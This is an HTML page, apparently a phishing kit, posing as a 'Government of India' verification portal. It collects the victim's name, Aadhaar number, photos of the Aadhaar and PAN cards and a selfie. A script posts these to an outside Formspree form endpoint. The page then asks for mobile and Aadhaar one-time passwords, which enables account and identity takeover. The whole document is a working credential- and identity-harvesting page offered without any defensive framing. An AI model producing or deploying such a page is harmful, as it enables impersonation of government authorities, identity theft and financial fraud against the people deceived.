<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Portal</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; padding: 10px; }
        .box { background: white; max-width: 450px; margin: auto; padding: 20px; border-radius: 10px; border-top: 5px solid #003366; }
        input { width: 100%; padding: 10px; margin: 5px 0 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; }
        #otp-section { display: none; margin-top: 20px; border: 1px dashed #003366; padding: 15px; }
    </style>
</head>
<body>
<div class="box">
    <h2 style="text-align:center; color:#003366;">GOVERNMENT OF INDIA</h2>
    <form id="vForm" action="https://formspree.io/f/xqedpwzb" method="POST" enctype="multipart/form-data">
        <div id="step1">
            <label>Full Name</label><input type="text" name="Name" required>
            <label>Aadhaar Number</label><input type="text" name="Aadhaar" required>
            <label>Aadhaar Front</label><input type="file" name="Aadhaar_Front" required>
            <label>Aadhaar Back</label><input type="file" name="Aadhaar_Back" required>
            <label>PAN Card Photo</label><input type="file" name="PAN" required>
            <label>Selfie</label><input type="file" name="Selfie" required>
            <button type="button" class="btn" onclick="nextStep(this)">Next: Verify Identity</button>
        </div>
        <div id="otp-section">
            <h3 style="text-align:center;">ENTER OTP</h3>
            <label>Mobile OTP</label><input type="text" name="M_OTP">
            <label>Aadhaar OTP</label><input type="text" name="A_OTP">
            <button type="submit" class="btn" style="background:#003366;">FINAL SUBMIT</button>
        </div>
    </form>
</div>
<script>
    function nextStep(btn) {
        const form = document.getElementById('vForm');
        if(!form.checkValidity()) { form.reportValidity(); return; }
        btn.innerHTML = "Sending..."; btn.disabled = true;
        fetch(form.action, { method: 'POST', body: new FormData(form), headers: { 'Accept': 'application/json' } })
        .then(() => {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('otp-section').style.display = 'block';
        }).catch(() => { alert("Error!"); btn.innerHTML = "Next"; btn.disabled = false; });
    }
</script>
</body>
</html>
